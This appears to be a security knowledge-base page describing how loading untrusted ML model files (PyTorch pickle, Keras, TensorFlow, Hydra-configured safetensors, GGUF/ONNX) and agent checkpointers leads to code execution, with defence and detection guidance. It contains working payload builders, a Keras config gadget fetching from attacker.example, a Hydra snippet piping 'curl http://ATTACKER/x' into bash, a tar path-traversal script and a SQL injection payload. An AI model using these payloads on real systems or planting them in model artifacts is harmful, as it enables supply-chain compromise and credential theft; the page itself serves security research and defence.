---
title: "ML Model Deserialization RCE (Models Are Code)"
type: technique
tags: [machine-learning, deserialization, rce, pickle, keras, pytorch, huggingface, supply-chain, ai]
phase: exploitation
date_created: 2026-07-02
date_updated: 2026-07-14
sources: [hiddenlayer-models-are-code, huntr-keras-deserialization, cve-2025-32434, cve-2025-1550, hacktricks-ai]
---

# ML Model Deserialization RCE (Models Are Code)

## What it is

Loading an untrusted machine-learning model file executes attacker-controlled code on the loading host. Most model formats are not inert data; they embed Python bytecode, pickle opcodes, or a computation graph that runs the moment a framework deserialises them. "The model is the payload": a `.pt`, `.bin`, `.h5`, `.keras`, or `.pkl` from a model hub, a teammate, or a CI artifact is functionally a program you are about to run.

## How it works

Deserialisation code paths in ML frameworks reconstruct arbitrary Python objects from a file. The dangerous mechanisms:

- **Pickle (`__reduce__`)**: PyTorch (`torch.load`), joblib, numpy `allow_pickle=True`, and raw `pickle.loads` all invoke an object's `__reduce__` method during unpickling, which returns a callable plus arguments to rebuild the object. An attacker sets `__reduce__` to return `(os.system, ("id",))`, so unpickling runs the command. Pickle is Turing-complete by design; there is no safe subset when the input is untrusted.
- **Marshalled bytecode (Keras Lambda)**: A Keras `Lambda` layer stores an arbitrary Python function as marshalled `.pyc` bytecode inside the model config. On load, `marshal.loads` reconstitutes the code object and the layer executes it. See [[insecure-deserialization]] for the general class.
- **Recursive class instantiation (Keras 3 config)**: A `.keras` archive's `config.json` names modules and classes that the loader imports and instantiates recursively. If the import is not allowlisted, any importable callable becomes a gadget.
- **Executable graphs (TensorFlow SavedModel)**: A SavedModel is a program. `@tf.function` graphs persist filesystem and string ops (`tf.io.read_file`, `tf.io.write_file`, `tf.io.decode_base64`) that run with the process's permissions when the model is served. Google treats this as intended behaviour, not a bug, and recommends sandboxing.

This is a supply-chain problem: models flow from public hubs like Hugging Face, from pipelines, and between teams, and the "just load it" ergonomics hide the code execution. Related: [[supply-chain-attacks]], [[llm-attacks]].

## Attack phases

- **Delivery / initial access**: a poisoned model on a hub or shared drive runs code on the first engineer or CI job that loads it.
- **Exploitation**: RCE in the context of the training box, inference server, or notebook kernel.
- **Post-exploitation**: pivot into cloud credentials on the ML host (often broad IAM), training data, and model registries.

## Prerequisites

- The target loads a model file whose provenance you can influence (upload to a hub, PR into a repo, artifact in a pipeline, a shared `.pkl`).
- A framework that deserialises with an unsafe path: pickle-based `torch.load` (pre-2.6.0, or 2.6.0+ but the specific `weights_only` bypass), `keras.models.load_model` with `safe_mode=False` or a vulnerable Keras version, `pickle.load`, `joblib.load`, `numpy.load(allow_pickle=True)`, or a served TensorFlow SavedModel.

## Methodology

1. **Fingerprint the format** from the file extension and magic bytes:
   - `.pt`, `.pth`, `.bin`, `.ckpt`, `.pkl`, `.joblib`, `.npy` (`allow_pickle`): pickle-based, assume RCE on load.
   - `.h5` / `.hdf5`: Keras HDF5, check for a `Lambda` layer.
   - `.keras`: ZIP archive; inspect `config.json` for `module`/`class_name` gadgets and `Lambda` layers.
   - SavedModel directory (`saved_model.pb` + `variables/`): executable graph.
   - `.safetensors`, `.onnx`: data-only formats, no code execution on load (the safe path, below).
2. **Confirm the load path**: grep the target code for `torch.load`, `load_model`, `pickle.load`, `joblib.load`, `np.load`, `from_pretrained`.
3. **Craft a benign proof first** (`touch /tmp/poc` or an out-of-band DNS/HTTP callback), never a destructive payload, on authorised engagements.
4. **Deliver and wait for load** (CI run, model registry pull, a reviewer opening the notebook).
5. **Escalate**: from RCE, harvest cloud metadata and credentials on the ML host (see [[aws-metadata-ssrf]] for the metadata endpoint pattern).

## Key payloads and examples

Malicious pickle via `__reduce__` (PyTorch `.pt`, joblib, numpy all share this):

```python
import torch, os

class Payload:
    def __reduce__(self):
        # runs on torch.load / pickle.load of this file
        return (os.system, ("id > /tmp/poc",))

torch.save({"state_dict": Payload()}, "model.pt")
# victim:  torch.load("model.pt")   -> executes id
```

Inspect a pickle without executing it (safe triage) using `pickletools`:

```bash
python3 -c "import pickletools,sys; pickletools.dis(open(sys.argv[1],'rb'))" model.pt | grep -iE 'GLOBAL|REDUCE|os|system|subprocess|eval|exec'
```

Keras Lambda-layer marshalled-bytecode RCE (HDF5, historically CVE-2024-3660):

```python
import tensorflow as tf

def exec_layer(x):
    __import__("os").system("id > /tmp/poc")
    return x

m = tf.keras.Sequential([tf.keras.layers.Lambda(exec_layer, input_shape=(1,))])
m.save("evil.h5")
# victim:  tf.keras.models.load_model("evil.h5")   -> command runs
```

Keras 3 config module-import bypass (CVE-2025-1550, Keras <= 3.8.0). The loader called `importlib.import_module(module)` on an attacker-chosen `"module"` field in `config.json` with no allowlist, then fetched a named attribute. A `.keras` archive's `config.json` pointing a layer's function at any importable callable achieves execution even with `safe_mode=True`, because the check only blocked `Lambda`, not arbitrary module import. Even after the 3.9 allowlist, allowed modules still expose reachable gadgets such as `keras.utils.get_file`, which downloads an attacker URL to a chosen path:

```json
{
  "module": "keras.utils",
  "class_name": "get_file",
  "config": null,
  "arguments": {
    "origin": "https://attacker.example/payload",
    "cache_dir": "/tmp",
    "force_download": true
  }
}
```

Enumerate callables inside allowlisted modules to find new gadgets:

```python
import keras, inspect
mod = keras.utils
for name in dir(mod):
    obj = getattr(mod, name)
    if callable(obj) and inspect.isfunction(obj):
        print(name, inspect.signature(obj))
```

## Bypasses and variants

- **`torch.load(weights_only=True)` bypass (CVE-2025-32434)**: PyTorch documented `weights_only=True` as the safe way to load untrusted checkpoints, and many teams adopted it as the mitigation. CVE-2025-32434 (PyTorch < 2.6.0, CVSS 9.3) proved RCE is still achievable with `weights_only=True`. Fix is PyTorch >= 2.6.0. Do not treat `weights_only=True` on an old PyTorch as safe.
- **Keras `safe_mode`**: `safe_mode=True` (default in Keras 3.9+) blocks `Lambda` deserialisation, but CVE-2025-1550 bypassed it through unrestricted module import. Never pass `safe_mode=False` for untrusted models, and pin Keras >= 3.9.
- **HDF5 vs `.keras`**: older `.h5` Lambda-layer attacks work on Keras <= 2.11 / tf-keras; the `.keras` config attacks target Keras 3. TensorFlow's built-in keras, `tf-keras`, and standalone Keras 3 have different security postures; check which one is imported.
- **Format laundering**: an attacker names a pickle file `model.safetensors` or ships a real `.safetensors` alongside a malicious `.bin` that some loaders prefer; verify the loader picks the safe file.
- **numpy / joblib / scikit-learn**: `np.load(allow_pickle=True)`, `joblib.load`, and any pickled sklearn estimator carry the same `__reduce__` RCE.

## Detection and defence

- **Prefer data-only formats**: `safetensors` (pure tensor data, no code, no arbitrary object graph) and `ONNX` for interchange. Convert untrusted `.pt`/`.h5` to `safetensors` inside a sandbox, then load the safe artifact.
- **Pin and patch**: PyTorch >= 2.6.0, Keras >= 3.9, and never `weights_only=False` / `safe_mode=False` on untrusted input.
- **Scan before load**: `picklescan`, `fickling`, ModelScan, and Hugging Face's automatic pickle scanning flag dangerous opcodes (`GLOBAL`/`REDUCE` to `os`, `subprocess`, `builtins.eval`). Statically disassemble with `pickletools.dis`.
- **Sandbox untrusted loads**: load and convert models in a network-isolated container with no cloud credentials mounted; TensorFlow explicitly recommends sandboxing SavedModels.
- **Provenance**: verify hashes and signatures; treat model-hub downloads like unsigned executables. EDR and AV rarely inspect ML artifacts, so do not rely on endpoint tooling.
- **Detection signals**: a model-loading process spawning `sh`/`bash`/`python -c`, outbound connections from a load step, or file writes outside the model cache.

## Tools

- `pickletools` / `fickling` / `picklescan` / ModelScan: static inspection and scanning of pickle and model files.
- `safetensors` and `onnx`: safe serialization targets.
- `torch`, `tensorflow`, `keras`: the frameworks whose load paths are under test; check versions with `pip show`.

## Metadata and format-driven model RCE beyond pickle

Beyond the pickle family, code execution fires even when the artifact is a "safe" non-pickle format, plus parser and archive bugs. Treat any model load as untrusted-input parsing, not just unpickling.

Hydra `_target_` metadata injection is the headline: libraries that feed untrusted model metadata or config into `hydra.utils.instantiate()` will import and call any dotted callable, so RCE happens with no pickle at all. This works inside a `.nemo` `model_config.yaml`, a HuggingFace repo `config.json`, or the `__metadata__` block of a `.safetensors` file (CVE-2025-23304, FlexTok, uni2TS).

```yaml
# Malicious metadata/config; executed during model load, even for safetensors
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Hydra keeps a string block-list, but it is bypassable through alternate import paths (for example `enum.bltns.eval`) or application-resolved names that resolve to `os.system`. Trigger points seen in the wild: NeMo `restore_from` and `from_pretrained`, uni2TS HuggingFace coders, FlexTok loaders (FlexTok also runs `ast.literal_eval` on stringified metadata, giving a CPU/memory DoS before the Hydra call).

Other non-pickle format paths worth testing on any target that loads attacker-supplied models:

- Keras legacy H5 downgrade: a `.h5` model with a Lambda layer still executes on load because `safe_mode` does not cover the old format, so a modern app that refuses `.keras` may still eat an `.h5`.
- TensorFlow YAML load (`CVE-2021-37678`) uses `yaml.unsafe_load`, giving code execution from a crafted model YAML.
- GGML / GGUF parser heap overflows (`CVE-2024-25664` and neighbors): a malformed `.gguf` corrupts the heap in llama.cpp-style loaders and can reach RCE.
- ONNX external-weights and tar handling (`CVE-2022-25882`, `CVE-2024-5187`): directory or tar traversal lets a model read arbitrary files or overwrite files on extract. ONNX custom ops require loading attacker native code.
- NVIDIA Triton model-control API path traversal (`CVE-2023-31036`) writes files outside the model dir (for example overwrite a startup script) for RCE.

Model archive path traversal (zip-slip) applies broadly because most model formats are zip or tar archives. A crafted member name or symlink escapes the extraction directory on load:

```python
import tarfile
def escape(member):
    member.name = "../../tmp/hacked"   # break out of the extract dir
    return member
with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Methodology: fingerprint the loader library and version, prefer a non-pickle format if the app claims "safe" loading, then test Hydra `_target_`, Keras Lambda H5, and archive traversal before concluding the model channel is inert. Defence stays the same: signed/allow-listed model sources, `weights_only=True`, sandboxed deserialization (non-root, no network egress), and never call `instantiate()` on untrusted config.

## AI agent-framework deserialization chains (persistence and checkpointer sinks)

A distinct class from malicious model files: the app exposes an agent persistence or memory API and user input reaches a query builder or a custom deserializer, so no model upload is needed. The LangGraph checkpointer chain is the reference case and generalizes to any agent framework with state history, replay, or checkpoint-listing endpoints.

Chain, from user input to RCE:

1. Structural SQLi in a metadata filter. A dict key is concatenated into a JSON path string (`json_extract(..., '$.{query_key}')`), so a quote in the key breaks out and injects SQL. Bound parameters protect values only, never identifiers, JSON paths, operators, `LIMIT`, or TTL fields.
2. `UNION SELECT` fabricates a fake result row whose serialized-checkpoint column is attacker-controlled, because the returned `type` and `checkpoint` bytes are later fed to `serde.loads_typed((type, checkpoint))`.

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

3. An unsafe MessagePack extension hook then imports and calls arbitrary code:

```python
# The custom msgpack reviver executes, equivalent to os.system("id > /tmp/pwned")
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Audit pattern for any agent stack: trace user-controlled input that reaches state history / memory / replay / checkpoint APIs, structured filter builders that generate SQL or Redis fragments, and custom revivers (`pickle`, `msgpack`, JSON object hooks, YAML constructors) that do dynamic import, reflection, or callable dispatch. Also review recovery paths that trust rows returned from the persistence layer. Affected LangGraph SQLite/Redis checkpointers were patched in `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, `langgraph-checkpoint 4.0.1+`.

## Sources

- HiddenLayer, "Models Are Code" (Innovation Hub): pickle `__reduce__`, Keras Lambda marshal, TensorFlow SavedModel graph ops.
- huntr blog, "Hunting Vulnerabilities in Keras Model Deserialization": `.keras` config attack surface, CVE-2024-3660 Lambda, CVE-2025-1550 module-import bypass, `safe_mode` allowlist and residual gadgets.
- CVE-2025-32434: `torch.load` RCE bypassing `weights_only=True`, fixed in PyTorch 2.6.0.
- CVE-2025-1550: Keras <= 3.8.0 arbitrary module import via `config.json` deserialization.
- HackTricks (AI): non-pickle/metadata model RCE (Hydra `_target_`, CVE-2025-23304, GGUF/ONNX/Triton, zip-slip) and agent-framework deserialization chains (LangGraph checkpointer SQLi to msgpack RCE).
- Related: [[insecure-deserialization]], [[supply-chain-attacks]], [[llm-attacks]], [[adversarial-ml]].
